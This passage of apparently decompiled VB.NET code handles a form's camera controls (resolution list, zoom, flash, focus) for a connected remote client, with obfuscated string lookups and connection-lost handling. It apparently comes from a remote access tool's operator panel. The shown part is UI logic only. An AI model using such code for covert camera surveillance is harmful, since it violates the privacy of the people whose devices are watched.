                            Dim strArrays2 As String() = strArrays1(1).Split(New String() {"*"}, StringSplitOptions.RemoveEmptyEntries)
                            If (CInt(strArrays2.Length) = 2) Then
                                Try
                                    flag = If(Not (strArrays2(0).Length < 4 And strArrays2(1).Length < 4 And Conversions.ToInteger(strArrays2(0).Trim()) <= 720 And Conversions.ToInteger(strArrays2(1).Trim()) <= 720), False, True)
                                Catch exception As System.Exception
                                    flag = False
                                End Try
                            End If
                            If (flag) Then
                                toolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem() With
                                {
                                    .Text = String.Concat("Size:", strArrays1(1)),
                                    .Name = String.Concat("m_item", Conversions.ToString(Me.SELCTE_SZ.Items.Count)),
                                    .Tag = strArrays1(1),
                                    .Enabled = flag,
                                    .ImageScaling = ToolStripItemImageScaling.None
                                }
                                Dim toolStripMenuItem3 As System.Windows.Forms.ToolStripMenuItem = toolStripMenuItem
                                AddHandler toolStripMenuItem3.Click, New EventHandler(AddressOf Me.SELSZ)
                                Me.SELCTE_SZ.Items.Add(toolStripMenuItem3)
                            End If
                            If (Not Me.SIZLAB.Enabled) Then
                                Me.SIZLAB.Enabled = True
                            End If
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(96)), False) = 0) Then
                            Dim str1 As String = strArrays1(1).ToString().Trim()
                            Me.maxZoom = Conversions.ToInteger(str1)
                            Me.BTNZay.Enabled = True
                            Me.BTNMIN.Enabled = True
                            Me.LBLZOOM.Enabled = True
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(97)), False) = 0) Then
                            Dim str2 As String = strArrays1(1).ToString().Trim()
                            Me.vulZoom = Conversions.ToInteger(str2)
                            Me.LBLZOOM.Text = String.Concat("ZOOM:", Conversions.ToString(Me.vulZoom), "%")
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(98)), False) = 0) Then
                            Me.BTNFLASH.Enabled = True
                            Me.LBFLMO.Enabled = True
                        ElseIf (Operators.CompareString(str, Store.BFF(Store.buff, CLng(99)), False) = 0) Then
                            Me.BTNFocus.Enabled = True
                            Me.LBFOC.Enabled = True
                        End If
                        num = num + 1
                    Loop While num <= length
                    Me.lock = True
                End If
            End If
            If (Not (Me.SIZLAB.Enabled And Me.SelCamera.Enabled)) Then
                Me.Panel1.Visible = False
            Else
                Me.QUALAB.Enabled = True
                Me.LABMUSH.Enabled = True
                Me.BTNMUSht.Enabled = True
                Me.STALAB.Enabled = True
                If (Not Me.DefProperties) Then
                    If (Me.SELCTE_SZ.Items.Count > 0) Then
                        Dim num1 As Integer = -1
                        num1 = If(Me.SELCTE_SZ.Items.Count <> 1, CInt(Math.Round(CDbl(Me.SELCTE_SZ.Items.Count) / 2)), 1)
                        If (num1 <> -1) Then
                            Me.SIZLAB.Tag = RuntimeHelpers.GetObjectValue(Me.SELCTE_SZ.Items(num1).Tag)
                            Me.SIZLAB.TxText = String.Concat("Size:", CStr(Me.SIZLAB.Tag))
                            Me.SIZLAB.Refresh()
                        End If
                    End If
                    Me.QUALAB.Tag = "71"
                    Dim qUALAB As ThemeCoBox = Me.QUALAB
                    If (Operators.ConditionalCompareObjectEqual(Me.QUALAB.Tag, "71", False)) Then
                        tag = "Auto"
                    Else
                        tag = Me.QUALAB.Tag
                    End If
                    qUALAB.TxText = String.Concat("Quality:", CStr(tag))
                    Me.QUALAB.Refresh()
                    Me.DefProperties = True
                End If
            End If
        Catch exception1 As System.Exception
        End Try
    End Sub

    Private Sub TFPS_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TFPS.Tick
        Me.FPS = Me.PreView
        Me.PreView = 0
        If (Me.FPS = 0) Then
            Me.PBox.Invalidate()
        End If
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (CObj(Me.Text) <> CObj(MyBase.Name)) Then
                Me.Text = MyBase.Name
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.MClient.mProgressBar(Store.BFF(Store.buff, CLng(71)), "null")
        Else
            Me.Text = String.Concat(MyBase.Name, Strings.Space(1), "-> Connection Lost ...")
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TZoom_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TZoom.Tick
        If (Me.boZoom) Then
            Me.boZoom = False
        End If
        Me.PBox.Invalidate()
    End Sub

End Class